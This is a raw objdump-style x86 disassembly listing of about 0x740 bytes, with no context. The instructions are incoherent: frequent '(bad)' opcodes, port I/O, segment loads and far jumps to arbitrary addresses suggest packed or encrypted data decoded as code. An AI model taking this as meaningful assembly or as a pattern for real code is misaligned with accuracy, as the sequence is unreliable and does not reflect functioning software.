  41df35:	outs   dx,BYTE PTR ds:[esi]
  41df36:	adc    eax,0xe9f8f3a0
  41df3b:	dec    eax
  41df3c:	lock stos BYTE PTR es:[edi],al
  41df3e:	jle    0x41df61
  41df40:	mov    ecx,fs
  41df42:	popa   
  41df43:	mov    ebx,0x117dae2f
  41df48:	xor    al,0xb4
  41df4a:	inc    eax
  41df4b:	sbb    eax,0x7791accf
  41df50:	or     eax,0x93107b0f
  41df55:	sbb    DWORD PTR [edx+0x5c],ebp
  41df58:	in     eax,0x8a
  41df5a:	mov    WORD PTR [esi],ss
  41df5c:	inc    edi
  41df5d:	xlat   BYTE PTR ds:[ebx]
  41df5e:	push   ds
  41df5f:	fwait
  41df60:	inc    eax
  41df61:	in     eax,0xee
  41df63:	adc    eax,0x29ad2ad0
  41df68:	mov    eax,DWORD PTR [eax+0x331879ed]
  41df6e:	xlat   BYTE PTR ds:[ebx]
  41df6f:	inc    esi
  41df70:	in     al,dx
  41df71:	cld    
  41df72:	pop    ds
  41df73:	in     al,dx
  41df74:	dec    edi
  41df75:	std    
  41df76:	xchg   esp,eax
  41df77:	mov    eax,0xee9d5be6
  41df7c:	sub    dl,ah
  41df7e:	ret    
  41df7f:	mov    bl,0xf
  41df81:	mov    es,ecx
  41df83:	mov    ds,WORD PTR [ebx-0x28]
  41df86:	int    0x1c
  41df88:	fiadd  DWORD PTR ds:0x894966a1
  41df8e:	addr16 sub eax,0x8200f3dc
  41df94:	(bad)  
  41df95:	out    0xa7,eax
  41df97:	mov    ds:0xada6ee6f,eax
  41df9c:	fsub   st(6),st
  41df9e:	cs jmp 0x3b64c300
  41dfa4:	sti    
  41dfa5:	cmc    
  41dfa6:	out    0x39,eax
  41dfa8:	(bad)  [ecx]
  41dfaa:	inc    esp
  41dfab:	xor    BYTE PTR [edi],dh
  41dfad:	stos   BYTE PTR es:[edi],al
  41dfae:	aas    
  41dfaf:	or     al,dh
  41dfb1:	dec    edi
  41dfb2:	cld    
  41dfb3:	out    dx,eax
  41dfb4:	mov    ch,0x58
  41dfb6:	sub    cl,BYTE PTR [ebx]
  41dfb8:	jmp    0x25dcd7ba
  41dfbd:	mov    edx,0x6beeefc
  41dfc2:	in     al,dx
  41dfc3:	cli    
  41dfc4:	cmp    ah,BYTE PTR [ebx-0x205c43ac]
  41dfca:	sbb    al,0x88
  41dfcc:	scas   eax,DWORD PTR es:[edi]
  41dfcd:	xor    ch,ch
  41dfcf:	push   ds
  41dfd0:	(bad)  
  41dfd1:	xor    al,0xe1
  41dfd3:	mov    eax,ds:0xd5d147ed
  41dfd8:	iret   
  41dfd9:	push   esi
  41dfda:	dec    esp
  41dfdb:	aam    0xea
  41dfdd:	xchg   ecx,eax
  41dfde:	and    ah,BYTE PTR [ecx-0x2b]
  41dfe1:	aam    0xca
  41dfe3:	mov    al,0xa3
  41dfe5:	xchg   BYTE PTR [edx],cl
  41dfe7:	or     ebx,ebp
  41dfe9:	jae    0x41df8e
  41dfeb:	inc    ebp
  41dfec:	adc    al,0xda
  41dfee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfef:	ja     0x41e021
  41dff1:	loope  0x41e001
  41dff3:	add    eax,0x7de12036
  41dff8:	test   eax,0xb4b87912
  41dffd:	jecxz  0x41dfcb
  41dfff:	sub    DWORD PTR [edx+edx*4+0x50a8a467],edi
  41e006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e007:	xchg   esp,eax
  41e008:	jmp    0x41e03e
  41e00a:	in     eax,0xb4
  41e00c:	dec    esi
  41e00d:	loope  0x41e012
  41e00f:	mov    al,0xe9
  41e011:	xor    BYTE PTR [eax],al
  41e013:	jnp    0x41dfb5
  41e015:	into   
  41e016:	or     al,0x65
  41e018:	hlt    
  41e019:	int    0xcc
  41e01b:	xchg   edx,eax
  41e01c:	ds out dx,al
  41e01e:	pop    edx
  41e01f:	or     bh,bl
  41e021:	and    al,0xf1
  41e023:	xor    dl,BYTE PTR [ecx]
  41e025:	retf   0x1c9e
  41e028:	push   eax
  41e029:	aad    0xbe
  41e02b:	push   ds
  41e02c:	psubsw mm3,QWORD PTR [esi-0x11]
  41e030:	and    eax,DWORD PTR [ecx+0x54542160]
  41e036:	jp     0x41dfcd
  41e038:	jge    0x41dfd8
  41e03a:	stos   DWORD PTR es:[edi],eax
  41e03b:	jge    0x41e096
  41e03d:	mov    es,WORD PTR [edx+0x45a370ea]
  41e043:	jmp    0x41dfe6
  41e045:	leave  
  41e046:	and    al,BYTE PTR [esi+eiz*1+0x614ee747]
  41e04d:	mov    edx,0xaca53799
  41e052:	jno    0x41e02c
  41e054:	sbb    dh,BYTE PTR [edi-0x58]
  41e057:	jb     0x41e087
  41e059:	and    eax,DWORD PTR [ebx-0x67]
  41e05c:	out    dx,eax
  41e05d:	in     al,0x83
  41e05f:	mov    DWORD PTR [ebp-0x3f],esp
  41e062:	push   eax
  41e063:	sub    BYTE PTR [ecx+0x1b],ah
  41e066:	or     BYTE PTR [esi],dl
  41e068:	aad    0xea
  41e06a:	inc    ebx
  41e06b:	sub    BYTE PTR [esi+esi*2-0x5f90adbc],bh
  41e072:	enter  0x4e92,0x9a
  41e076:	adc    eax,0x335f56b
  41e07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e07c:	push   ds
  41e07d:	add    al,al
  41e07f:	add    DWORD PTR [ecx+0x25],ecx
  41e082:	sub    dh,BYTE PTR [ebx+0x790fca33]
  41e088:	call   0xced31fdc
  41e08d:	dec    ecx
  41e08e:	mov    eax,0x142a77ef
  41e093:	sti    
  41e094:	pop    edx
  41e095:	loop   0x41e025
  41e097:	push   esp
  41e098:	inc    ebp
  41e099:	inc    esi
  41e09a:	sti    
  41e09b:	xchg   dh,bh
  41e09d:	mov    bh,0x7
  41e09f:	aad    0xc9
  41e0a1:	dec    ecx
  41e0a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0a3:	pop    esi
  41e0a4:	cwde   
  41e0a5:	sar    DWORD PTR [esi+0x77c116da],cl
  41e0ab:	lahf   
  41e0ac:	sar    al,1
  41e0ae:	mov    ebx,DWORD PTR [ebp-0x11]
  41e0b1:	test   BYTE PTR [esi-0x7898182e],dl
  41e0b7:	mov    ch,BYTE PTR [edi]
  41e0b9:	adc    edx,DWORD PTR [ecx]
  41e0bb:	mov    eax,0x4b1fe0f2
  41e0c0:	mov    ebp,0xb575797d
  41e0c5:	mov    ch,0x9d
  41e0c7:	mov    bl,BYTE PTR [ecx-0x47854ea4]
  41e0cd:	int    0xb6
  41e0cf:	lods   eax,DWORD PTR ds:[esi]
  41e0d0:	and    esi,esp
  41e0d2:	push   ebp
  41e0d3:	add    al,0xca
  41e0d5:	ret    0x959e
  41e0d8:	xlat   BYTE PTR ds:[ebx]
  41e0d9:	sub    BYTE PTR [eax-0x48],ch
  41e0dc:	adc    DWORD PTR [esi],esi
  41e0de:	aad    0xe7
  41e0e0:	(bad)  
  41e0e1:	sbb    DWORD PTR [edx+0x4a],esp
  41e0e4:	add    BYTE PTR es:[edx-0x759f2216],ah
  41e0eb:	sbb    BYTE PTR [ecx+edx*1+0x23df633d],al
  41e0f2:	push   di
  41e0f4:	popf   
  41e0f5:	inc    eax
  41e0f6:	into   
  41e0f7:	jle    0x41e0f4
  41e0f9:	jmp    0x41e116
  41e0fb:	push   ecx
  41e0fc:	mov    cl,0x35
  41e0fe:	inc    esp
  41e0ff:	stos   BYTE PTR es:[edi],al
  41e100:	dec    ebp
  41e101:	mov    eax,0xe8f652a8
  41e106:	or     al,0xd9
  41e108:	into   
  41e109:	shl    dl,1
  41e10b:	nop
  41e10c:	int3   
  41e10d:	nop    DWORD PTR [ecx+0x37cdc96a]
  41e114:	pop    ebx
  41e115:	bound  edx,QWORD PTR [eax+0x3f7b4e20]
  41e11b:	fs jnp 0x41e121
  41e11e:	dec    esp
  41e11f:	sti    
  41e120:	ins    DWORD PTR es:[edi],dx
  41e121:	aad    0x84
  41e123:	jbe    0x41e0f5
  41e125:	push   ebp
  41e126:	mov    ecx,0x91e45e21
  41e12b:	and    BYTE PTR [eax-0x1c],0xba
  41e12f:	ret    0x5c20
  41e132:	pop    esi
  41e133:	retf   0xa906
  41e136:	or     eax,0x66bbbeb6
  41e13b:	and    DWORD PTR [esi-0x2b],esp
  41e13e:	mov    ebx,0xc67af7e9
  41e143:	or     cl,BYTE PTR [ecx]
  41e145:	xor    DWORD PTR fs:[esi+0x55],edi
  41e149:	test   DWORD PTR [ebx-0x5987a2d6],edi
  41e14f:	cmp    al,0xb3
  41e151:	fsub   QWORD PTR ds:0x30f1a7ab
  41e157:	nop
  41e158:	add    al,0xd6
  41e15a:	imul   esp,ebx,0xffffffe3
  41e15d:	jno    0x41e0ef
  41e15f:	push   0x72
  41e161:	ins    BYTE PTR es:[edi],dx
  41e162:	aad    0x3
  41e164:	es je  0x41e152
  41e167:	sbb    esi,DWORD PTR [esi-0x1efe0841]
  41e16d:	xchg   DWORD PTR [ebp-0x398168f8],edi
  41e173:	and    DWORD PTR [eax],esp
  41e175:	(bad)  
  41e176:	leave  
  41e177:	jmp    0x2873a85d
  41e17c:	cmp    edx,esp
  41e17e:	fidivr WORD PTR es:[edi-0x6bb2e24]
  41e185:	mov    ebx,0xa4edc47d
  41e18a:	xor    edx,ecx
  41e18c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e18d:	shl    DWORD PTR [edi-0x6a],1
  41e190:	neg    BYTE PTR [ebx+0x319308ca]
  41e196:	(bad)  
  41e197:	retf   0x6c7a
  41e19a:	push   ebx
  41e19b:	mov    ch,0x57
  41e19d:	in     eax,dx
  41e19e:	es jne 0x41e198
  41e1a1:	fisttp QWORD PTR [edi+0x1]
  41e1a4:	pushf  
  41e1a5:	mov    BYTE PTR [ebx+0x60645727],ch
  41e1ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1ac:	dec    eax
  41e1ae:	dec    ebx
  41e1af:	add    BYTE PTR [ebp+0x7538361a],0xc7
  41e1b6:	je     0x41e149
  41e1b8:	ds scas eax,DWORD PTR es:[edi]
  41e1ba:	icebp  
  41e1bb:	mov    al,0xd8
  41e1bd:	mov    esi,0xc0f92bef
  41e1c2:	rep stos BYTE PTR es:[edi],al
  41e1c4:	mov    gs,WORD PTR [ebx+0x3c]
  41e1c7:	mov    dh,0xac
  41e1c9:	pop    ecx
  41e1ca:	xchg   BYTE PTR [eax-0x49],ch
  41e1cd:	ret    
  41e1ce:	cld    
  41e1cf:	fld    TBYTE PTR [ebx-0x1a]
  41e1d2:	sbb    bh,BYTE PTR [ebp-0x75ad57ca]
  41e1d8:	addr16 in al,dx
  41e1da:	mov    eax,DWORD PTR [ebp+0x7f]
  41e1dd:	push   0xb
  41e1df:	leave  
  41e1e0:	inc    ecx
  41e1e1:	inc    edi
  41e1e2:	inc    ebx
  41e1e3:	push   0x190bb56b
  41e1e8:	sbb    al,BYTE PTR [ecx]
  41e1ea:	push   es
  41e1eb:	jmp    0x41e20d
  41e1ed:	call   0x9d249de2
  41e1f2:	pop    edi
  41e1f3:	add    BYTE PTR [ebp+ebx*8-0x22],bh
  41e1f7:	push   eax
  41e1f8:	xchg   esi,esi
  41e1fa:	mov    fs,ecx
  41e1fc:	jl     0x41e258
  41e1fe:	dec    ebp
  41e1ff:	stc    
  41e200:	addr16 jmp 0x41e18a
  41e203:	sub    ebp,DWORD PTR [edx+0x1fd73a45]
  41e209:	xlat   BYTE PTR ds:[ebx]
  41e20a:	lock dec esp
  41e20c:	out    0x5b,al
  41e20e:	int    0xc3
  41e210:	cmc    
  41e211:	dec    ebx
  41e212:	push   ds
  41e213:	retf   
  41e214:	and    ch,BYTE PTR [ecx]
  41e216:	sbb    al,0xfa
  41e218:	push   0xffffffc4
  41e21a:	inc    eax
  41e21b:	xlat   BYTE PTR ds:[ebx]
  41e21c:	ds test eax,0x88bb3769
  41e222:	aam    0xc2
  41e224:	jle    0x41e297
  41e226:	mov    WORD PTR [edi],es
  41e228:	pop    edi
  41e229:	mov    ebx,0xfdb9485a
  41e22e:	mov    bh,0xd5
  41e230:	add    esi,esp
  41e232:	popa   
  41e233:	inc    ah
  41e235:	fadd   QWORD PTR [edi]
  41e237:	push   es
  41e238:	dec    esi
  41e239:	daa    
  41e23a:	sub    DWORD PTR [ecx],ebp
  41e23c:	xchg   edx,eax
  41e23d:	icebp  
  41e23e:	gs je  0x41e28e
  41e241:	jecxz  0x41e21b
  41e243:	jne    0x41e25f
  41e245:	ds jo  0x41e1d6
  41e248:	mov    ds:0x47e2f1ae,al
  41e24d:	sbb    BYTE PTR [ecx],al
  41e24f:	das    
  41e250:	or     bl,ah
  41e252:	test   BYTE PTR [esi-0x16],0x18
  41e256:	loop   0x41e2c0
  41e258:	(bad)  
  41e259:	dec    ecx
  41e25a:	mov    al,ds:0xaea72174
  41e25f:	pusha  
  41e260:	cmp    DWORD PTR [ecx],eax
  41e262:	mov    ebx,0x2b0c05e5
  41e267:	xchg   bh,al
  41e269:	ss into 
  41e26b:	std    
  41e26c:	inc    ecx
  41e26d:	adc    dl,bh
  41e26f:	cmp    DWORD PTR [ecx-0x1d],eax
  41e272:	sub    dh,BYTE PTR [ebp+0x15bf6462]
  41e278:	mov    WORD PTR [edx],cs
  41e27a:	inc    ebp
  41e27b:	das    
  41e27c:	lock je 0x41e2d8
  41e27f:	fdivr  st(7),st
  41e281:	add    esi,edx
  41e283:	inc    ecx
  41e284:	or     ah,BYTE PTR [ecx]
  41e286:	leave  
  41e287:	in     eax,0x54
  41e289:	dec    esp
  41e28a:	mov    DWORD PTR [edi+0x50d39eff],esi
  41e290:	jp     0x41e21c
  41e292:	jno    0x41e2f8
  41e294:	addr16 (bad) 
  41e296:	aad    0x57
  41e298:	idiv   DWORD PTR [ecx]
  41e29a:	ss push ebp
  41e29c:	fsub   QWORD PTR [edi+esi*2-0x2743c3e7]
  41e2a3:	adc    DWORD PTR [eax],0x31023c01
  41e2a9:	xor    DWORD PTR [esi-0x1b8dc13],edx
  41e2af:	pop    ebx
  41e2b0:	outs   dx,BYTE PTR ds:[esi]
  41e2b1:	mov    esp,0xabbad635
  41e2b6:	push   es
  41e2b7:	nop
  41e2b8:	jl     0x41e29e
  41e2ba:	lds    ebx,FWORD PTR [esi]
  41e2bc:	or     DWORD PTR [ecx-0x8],eax
  41e2bf:	lods   eax,DWORD PTR ds:[esi]
  41e2c0:	sti    
  41e2c1:	repz mov ebp,0x1fe4cfcd
  41e2c7:	xchg   esp,eax
  41e2c8:	bound  ecx,QWORD PTR [edi]
  41e2ca:	sti    
  41e2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2cc:	push   0x8
  41e2ce:	daa    
  41e2cf:	or     eax,0xe9b78a96
  41e2d4:	ds in  al,0xf2
  41e2d7:	jne    0x41e2d6
  41e2d9:	je     0x41e353
  41e2db:	sahf   
  41e2dc:	mov    al,ds:0x2d12910e
  41e2e1:	push   esp
  41e2e2:	out    0x99,eax
  41e2e4:	jmp    0x5629:0x3a9f389c
  41e2eb:	and    ch,BYTE PTR [ecx+0x14]
  41e2ee:	and    esp,DWORD PTR [eax]
  41e2f0:	mov    ecx,0xc18261d1
  41e2f5:	fwait
  41e2f6:	push   edx
  41e2f7:	outs   dx,DWORD PTR ds:[esi]
  41e2f8:	dec    eax
  41e2f9:	pop    edi
  41e2fa:	int3   
  41e2fb:	mov    al,ds:0x56d9106c
  41e300:	xlat   BYTE PTR ds:[ebx]
  41e301:	sbb    BYTE PTR [esi-0x730a2142],al
  41e307:	mov    BYTE PTR [ebp+0x388a9cc5],bl
  41e30d:	ret    0xa66
  41e310:	repz sub ebp,DWORD PTR [eax+eax*8-0x6905dfeb]
  41e318:	or     ah,BYTE PTR [esi+0x64d4c87e]
  41e31e:	push   ebp
  41e31f:	adc    esp,DWORD PTR [esi]
  41e321:	es sub al,0x6
  41e324:	call   0x1336:0xdd84e2c7
  41e32b:	lds    esp,FWORD PTR ds:[esi]
  41e32e:	sar    BYTE PTR [ebx],1
  41e330:	add    bl,BYTE PTR [edx-0x6d479796]
  41e336:	sbb    ecx,eax
  41e338:	cmp    esi,0x7bc725a0
  41e33e:	les    eax,FWORD PTR [ecx]
  41e340:	mov    cl,BYTE PTR [eax]
  41e342:	pop    esi
  41e343:	mov    ebp,0xe5ee73af
  41e348:	outs   dx,DWORD PTR ds:[esi]
  41e349:	jg     0x41e2f7
  41e34b:	rcr    ebp,1
  41e34d:	call   0x8abb5c70
  41e352:	cmc    
  41e353:	xchg   edi,eax
  41e354:	je     0x41e2e4
  41e356:	les    edx,FWORD PTR [eax+0x1f]
  41e359:	sti    
  41e35a:	stos   DWORD PTR es:[edi],eax
  41e35b:	ja     0x41e308
  41e35d:	mov    DWORD PTR ss:[esi],ecx
  41e360:	add    DWORD PTR [edx+0x6ed36650],edi
  41e366:	inc    eax
  41e367:	and    cl,BYTE PTR [ebp-0x4add8dd6]
  41e36d:	and    BYTE PTR [eax-0x716e6f3e],dl
  41e373:	pop    edi
  41e374:	es xor eax,0x2397dad5
  41e37a:	test   DWORD PTR [esi+0x378389b4],esp
  41e380:	test   al,0xa9
  41e382:	xchg   DWORD PTR [ebx+0x6a1986a2],ecx
  41e388:	call   0x296e8e20
  41e38d:	rcr    BYTE PTR [esi+0x65],cl
  41e390:	(bad)  
  41e391:	std    
  41e392:	mov    esp,0x3c13541c
  41e397:	jnp    0x41e381
  41e399:	in     al,0x47
  41e39b:	ret    
  41e39c:	mov    ch,0xb9
  41e39e:	jbe    0x41e3b0
  41e3a0:	cmp    dh,BYTE PTR [ebx]
  41e3a2:	xchg   ecx,eax
  41e3a3:	cmp    BYTE PTR [ebx+ebp*2],dh
  41e3a6:	dec    esp
  41e3a7:	dec    ebx
  41e3a8:	in     eax,0xb4
  41e3aa:	fstp   QWORD PTR [ebp*4-0x3d32fad4]
  41e3b1:	add    bl,cl
  41e3b3:	outs   dx,DWORD PTR ds:[esi]
  41e3b4:	dec    ebx
  41e3b5:	or     al,0x93
  41e3b7:	pop    eax
  41e3b8:	mov    eax,0x2d6b6301
  41e3bd:	mov    dl,0xb
  41e3bf:	call   0x5422:0xd69613ae
  41e3c6:	ffreep st(3)
  41e3c8:	mov    eax,0x67ce5023
  41e3cd:	gs inc esp
  41e3cf:	je     0x41e411
  41e3d1:	ins    DWORD PTR es:[edi],dx
  41e3d2:	add    esi,DWORD PTR [eax-0x1c]
  41e3d5:	mov    bl,0x91
  41e3d7:	jmp    0x57c7:0xc52bdce7
  41e3de:	cmp    al,0x70
  41e3e0:	int3   
  41e3e1:	mov    ebx,0x74f22682
  41e3e6:	leave  
  41e3e7:	jmp    0x41e3aa
  41e3e9:	add    ecx,0xc0377947
  41e3ef:	sub    cl,BYTE PTR [ebx]
  41e3f1:	jecxz  0x41e3ee
  41e3f3:	mov    esi,0x4eeb21f7
  41e3f8:	pop    edi
  41e3f9:	xor    ebp,edx
  41e3fb:	outs   dx,BYTE PTR ds:[esi]
  41e3fc:	mov    eax,0x6aa4a5a7
  41e401:	cli    
  41e402:	inc    eax
  41e403:	pop    edi
  41e404:	gs jno 0x41e3ea
  41e407:	sub    DWORD PTR [ecx-0x2e],ecx
  41e40a:	jns    0x41e43a
  41e40c:	(bad)  
  41e40d:	push   esi
  41e40e:	mov    al,ds:0x21f8c761
  41e413:	add    dl,BYTE PTR [eax-0x5b]
  41e416:	push   esi
  41e417:	les    esi,FWORD PTR [edx-0x27]
  41e41a:	popf   
  41e41b:	mov    ch,0xb6
  41e41d:	ins    DWORD PTR es:[edi],dx
  41e41e:	pop    eax
  41e41f:	pop    ebp
  41e420:	in     eax,0x4c
  41e422:	sahf   
  41e423:	clc    
  41e424:	xchg   DWORD PTR [edi+eiz*1],edx
  41e427:	cmp    BYTE PTR [eax+eiz*8+0xe],al
  41e42b:	fcmovb st,st(7)
  41e42d:	fimul  DWORD PTR [esi]
  41e42f:	mov    esp,0xd2b7afcb
  41e434:	fst    DWORD PTR [esi+0x8]
  41e437:	loope  0x41e3ba
  41e439:	inc    edx
  41e43a:	adc    cl,cl
  41e43c:	xchg   DWORD PTR [ebx],edx
  41e43e:	cmp    al,0x28
  41e440:	xor    DWORD PTR [ebp-0x6],edx
  41e443:	and    al,0x16
  41e446:	cmc    
  41e447:	cmp    ebx,DWORD PTR [esi]
  41e449:	mov    fs,edi
  41e44b:	gs das 
  41e44d:	jbe    0x41e44c
  41e44f:	stos   DWORD PTR es:[edi],eax
  41e450:	aad    0x5
  41e452:	enter  0xcc50,0x7a
  41e456:	push   cs
  41e457:	outs   dx,BYTE PTR ds:[esi]
  41e458:	adc    eax,DWORD PTR [esi+0x24b92eb2]
  41e45e:	or     BYTE PTR [ebp-0x7493cbbe],dl
  41e464:	psrlw  mm1,mm3
  41e467:	ret    0x34de
  41e46a:	sub    ch,ch
  41e46c:	sbb    eax,0xcf1ee48d
  41e471:	xchg   ebx,eax
  41e472:	and    BYTE PTR [edx+ecx*4+0x372f173e],ah
  41e479:	sti    
  41e47a:	fwait
  41e47b:	cli    
  41e47c:	in     eax,dx
  41e47d:	sub    eax,0xb57061d7
  41e482:	push   esp
  41e483:	aam    0xf1
  41e485:	loop   0x41e40d
  41e487:	bound  esi,QWORD PTR [ebp-0x73]
  41e48a:	outs   dx,BYTE PTR ds:[esi]
  41e48c:	sti    
  41e48d:	sbb    cl,BYTE PTR [esi+0x3cd78ddd]
  41e493:	in     eax,dx
  41e494:	xchg   ebx,eax
  41e495:	scas   al,BYTE PTR es:[edi]
  41e496:	and    al,0xe3
  41e498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e499:	js     0x41e4c8
  41e49b:	fwait
  41e49c:	hlt    
  41e49d:	cmc    
  41e49e:	lds    edi,FWORD PTR [edx-0x59]
  41e4a1:	xchg   edi,eax
  41e4a2:	cmc    
  41e4a3:	mov    esp,0x52efbbaf
  41e4a8:	ss xor edx,ebp
  41e4ab:	or     DWORD PTR [ebp+0x432ff98b],edx
  41e4b1:	daa    
  41e4b2:	(bad)  
  41e4b3:	sahf   
  41e4b4:	pop    ds
  41e4b5:	icebp  
  41e4b6:	sbb    al,0x77
  41e4b8:	scas   al,BYTE PTR es:[edi]
  41e4b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4ba:	jmp    0x4c1f9b3a
  41e4bf:	(bad)  
  41e4c0:	add    DWORD PTR fs:[esi+0x23],0xa5689d1b
  41e4c8:	and    cl,BYTE PTR [esi]
  41e4ca:	push   edi
  41e4cb:	and    BYTE PTR [ebp-0x7b],ch
  41e4ce:	pop    esp
  41e4cf:	fistp  QWORD PTR [edx-0x5f]
  41e4d2:	es push edi
  41e4d4:	cmp    ecx,DWORD PTR [ebx-0x6c]
  41e4d7:	cmp    al,ch
  41e4d9:	mov    eax,ds:0x7bb08377
  41e4de:	xchg   ebp,eax
  41e4df:	add    al,ch
  41e4e1:	ins    DWORD PTR es:[edi],dx
  41e4e2:	pushf  
  41e4e3:	sub    esi,DWORD PTR [ebx]
  41e4e5:	xchg   edi,eax
  41e4e6:	or     al,0x6c
  41e4e8:	adc    al,0x86
  41e4ea:	jge    0x41e4f7
  41e4ec:	xor    edi,DWORD PTR [ebp+0x3]
  41e4ef:	mov    eax,0x59d89439
  41e4f4:	(bad)  
  41e4f6:	pop    ebp
  41e4f7:	outs   dx,DWORD PTR ds:[esi]
  41e4f8:	ret    0x4f9f
  41e4fb:	dec    ebx
  41e4fc:	(bad)  
  41e4fd:	and    esp,ecx
  41e4ff:	gs nop
  41e501:	jno    0x41e533
  41e503:	shl    DWORD PTR [ebx],cl
  41e505:	mov    cl,0x79
  41e507:	out    dx,eax
  41e508:	mov    esp,0xcb419c20
  41e50d:	mov    ah,0xcf
  41e50f:	repnz push 0xffffffa1
  41e512:	pop    edx
  41e513:	scas   al,BYTE PTR es:[edi]
  41e514:	pop    ss
  41e515:	call   0xc3d21a65
  41e51a:	xor    eax,0xb8ac0da6
  41e51f:	stos   BYTE PTR es:[edi],al
  41e520:	push   esp
  41e521:	mov    bh,ah
  41e523:	fisub  DWORD PTR [ebx+ecx*1+0x7ff8b167]
  41e52a:	and    ch,BYTE PTR [ebx+edx*1+0x5f]
  41e52e:	call   0x76eb:0x9beb6855
  41e535:	xchg   ecx,eax
  41e536:	inc    eax
  41e537:	or     eax,0xbf86e88d
  41e53c:	jp     0x41e4dc
  41e53e:	loop   0x41e589
  41e540:	retf   
  41e541:	icebp  
  41e542:	cld    
  41e543:	in     al,dx
  41e544:	pop    eax
  41e545:	fiadd  DWORD PTR [eax-0x18]
  41e548:	mov    eax,0x268c5126
  41e54d:	retf   
  41e54e:	adc    edi,ecx
  41e550:	dec    esp
  41e551:	adc    dh,bl
  41e553:	inc    edi
  41e554:	xor    eax,DWORD PTR [ecx-0x4c]
  41e557:	or     BYTE PTR [esi],0x8d
  41e55a:	xor    DWORD PTR [edx-0x50],esp
  41e55d:	in     eax,0x8f
  41e55f:	cmp    DWORD PTR [edi-0x78],ecx
  41e562:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41e564:	jnp    0x41e516
  41e566:	inc    BYTE PTR [ecx-0xa]
  41e569:	xor    al,0x51
  41e56b:	mov    ds:0x22cb4948,al
  41e570:	or     al,0xf7
  41e572:	fisub  WORD PTR [esi-0x36]
  41e575:	mov    al,ds:0xdb558258
  41e57a:	retf   
  41e57b:	popa   
  41e57c:	mov    ebp,0xbe6f9cbd
  41e581:	mov    esp,DWORD PTR [eax-0x34e9b616]
  41e587:	int    0xc4
  41e589:	repz cmc 
  41e58b:	mov    bl,0xb7
  41e58d:	movups xmm0,XMMWORD PTR [edi]
  41e590:	in     eax,dx
  41e591:	sub    dh,0xa2
  41e594:	inc    edx
  41e595:	inc    eax
  41e596:	mov    al,ds:0xdd051c3f
  41e59b:	adc    DWORD PTR [esi+0x8],eax
  41e59e:	mov    edi,0x5a1a736e
  41e5a3:	stos   DWORD PTR es:[edi],eax
  41e5a4:	pop    esi
  41e5a5:	pushf  
  41e5a6:	dec    esp
  41e5a7:	ja     0x41e5de
  41e5a9:	out    0x22,al
  41e5ab:	mov    ds:0x9603e9bc,al
  41e5b0:	in     eax,dx
  41e5b1:	jp     0x41e591
  41e5b3:	sbb    DWORD PTR [edx],ebp
  41e5b5:	inc    ecx
  41e5b6:	fwait
  41e5b7:	push   ebp
  41e5b8:	adc    DWORD PTR [edx+0x58],ecx
  41e5bb:	inc    ebx
  41e5bc:	popa   
  41e5bd:	jg     0x41e552
  41e5bf:	stos   DWORD PTR es:[edi],eax
  41e5c0:	and    ebp,ecx
  41e5c2:	push   edi
  41e5c3:	sub    DWORD PTR [ecx+0x34],esp
  41e5c6:	ss (bad) 
  41e5c8:	fsubrp st(5),st
  41e5ca:	into   
  41e5cb:	cli    
  41e5cc:	or     al,0x59
  41e5ce:	jne    0x41e5a0
  41e5d0:	jecxz  0x41e55a
  41e5d2:	sub    BYTE PTR [edx-0x24],0xe7
  41e5d6:	push   cs
  41e5d7:	imul   ebx,DWORD PTR [edi-0x50],0xabeeaad
  41e5de:	pop    ebp
  41e5df:	cmp    ecx,ebx
  41e5e1:	adc    edi,esi
  41e5e3:	(bad)  
  41e5e5:	loope  0x41e5cb
  41e5e7:	mul    DWORD PTR [esi+0x1397b4a6]
  41e5ed:	pop    ss
  41e5ee:	scas   eax,DWORD PTR es:[edi]
  41e5ef:	scas   al,BYTE PTR es:[edi]
  41e5f0:	ss jp  0x41e648
  41e5f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5f4:	fidivr DWORD PTR [ecx-0x43]
  41e5f7:	das    
  41e5f8:	xor    edi,DWORD PTR [ebx+ebx*4-0x7b]
  41e5fc:	pop    ebx
  41e5fd:	jne    0x41e5ff
  41e5ff:	(bad)  
  41e601:	mov    eax,0x9b3a7770
  41e606:	cmp    al,0xf6
  41e608:	jmp    0x6e38:0x54975542
  41e60f:	mov    edx,0xed6fb95b
  41e614:	mov    bl,0xfb
  41e616:	dec    ebp
  41e617:	jns    0x41e692
  41e619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e61a:	sahf   
  41e61b:	mov    dh,ch
  41e61d:	or     ebx,DWORD PTR [ebp+0x1d]
  41e620:	test   eax,0xaec5db9e
  41e625:	push   ebp
  41e626:	dec    ecx
  41e627:	out    dx,al
  41e628:	adc    BYTE PTR [edi-0x43],ch
  41e62b:	pop    edi
  41e62c:	dec    edx
  41e62d:	fwait
  41e62e:	xchg   edi,eax
  41e62f:	ins    BYTE PTR es:[edi],dx
  41e630:	sar    BYTE PTR [eax+0x4d],cl
  41e633:	xor    ecx,esp
  41e635:	or     eax,0x4ac85d8c
  41e63a:	iret   
  41e63b:	push   eax
  41e63c:	jmp    0x41e639
  41e63e:	shl    cl,1
  41e640:	xchg   edi,eax
  41e641:	in     al,0xbb
  41e643:	out    dx,eax
  41e644:	mov    DWORD PTR [edi],0xc6746d7e
  41e64a:	fwait
  41e64b:	adc    edi,DWORD PTR [edx+0x40]
  41e64e:	sar    BYTE PTR [esi],0xb3
  41e651:	xchg   ebp,eax
  41e652:	inc    eax
  41e653:	seto   BYTE PTR [ebx+esi*2-0x65]
  41e658:	inc    esi
  41e659:	sbb    eax,0xcd51ee4e
  41e65e:	stos   DWORD PTR es:[edi],eax
  41e65f:	and    DWORD PTR [esi+0x6d],esp
  41e662:	xchg   ax,ax
  41e664:	loop   0x41e603
  41e666:	or     DWORD PTR [eax-0x317eed69],0x2902cc9c
  41e670:	test   ecx,0x7af22e23
  41e676:	das    
  41e677:	loopne 0x41e6c1
  41e679:	dec    ecx
